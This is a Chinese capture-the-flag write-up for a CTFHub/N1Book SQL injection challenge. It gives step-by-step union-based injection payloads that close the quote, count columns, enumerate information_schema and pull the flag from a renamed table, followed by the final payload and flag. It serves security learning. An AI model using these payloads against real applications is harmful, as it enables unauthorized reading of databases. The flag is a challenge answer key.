---
layout: null
---

### 题目名称：SQL注入-1

题目来源：CTFHub（原题：N1Book-第一章Web入门-CTF中的SQL注入-SQL注入-1）

题目类别：Web

题目描述：

![notes](Ch-ph-wp23-1.png)

页面是一个笔记站，访问 index.php?id=1 会显示一条笔记的内容，id 传 4 以后就没有内容了。页面上还有一条提示：

```
tips
if too diffcult ,add &tips=1 to the url !
```

### 解题思路

加上 tips=1 之后，页面顶部会直接把拼接好的 SQL 语句打出来，等于告诉我们后端语句是 select * from notes where id ='输入'，而且 id 是被单引号包起来的，属于字符型注入。

页面本身会把查到的标题和内容显示出来，也就是有回显，所以走联合查询最省事。先单引号闭合再用 -- - 把后面的引号注释掉，然后用 order by 猜字段数，确认是 3 列；再用 id=0 让前半句查不到数据，这样页面只会显示 union 后面我们注入的那一行，回显位置是第 2 列和第 3 列。

最后查 information_schema 拿到真实的表名和列名，这张表和字段都做了变形（表叫 fl4g，字段叫 fllllag），直接猜 flag 是猜不到的。

### 详细步骤

1. 访问 index.php?id=1，页面显示一条笔记，说明查询结果会回显

2. 按提示加上 tips=1，页面顶部打出后端语句

    ```
    select * from notes where id ='1'
    ```

    由此知道是字符型注入，闭合符号是单引号

3. 单引号闭合，并用 -- - 注释掉后面的引号

    ```
    ?id=1'-- -
    ```

4. 用 order by 猜字段数

    ```
    ?id=1' order by 3-- -    有回显
    ?id=1' order by 4-- -    没有回显
    ```

    说明一共 3 列

5. 用 id=0 让原查询查不到数据，再 union 找回显位置

    ```
    ?id=0' union select 1,2,3-- -
    ```

    页面第 2 列显示 2，第 3 列显示 3，说明这两列会回显

6. 查库名、表名

    ```
    ?id=0' union select 1,database(),3-- -
    ?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -
    ```

    库名是 note，表名是 fl4g、notes

7. 查 fl4g 表的字段名。表名用十六进制 0x666c3467 表示，避开可能的过滤

    ```
    ?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x666c3467-- -
    ```

    字段名是 fllllag

8. 直接查这个字段

    ```
    ?id=0' union select 1,fllllag,3 from fl4g-- -
    ```

    页面返回 n1book{union_select_is_so_cool}，获得flag

### Payload

```
?id=0' union select 1,fllllag,3 from fl4g-- -
```

### flag

n1book{union_select_is_so_cool}

### 总结&反思
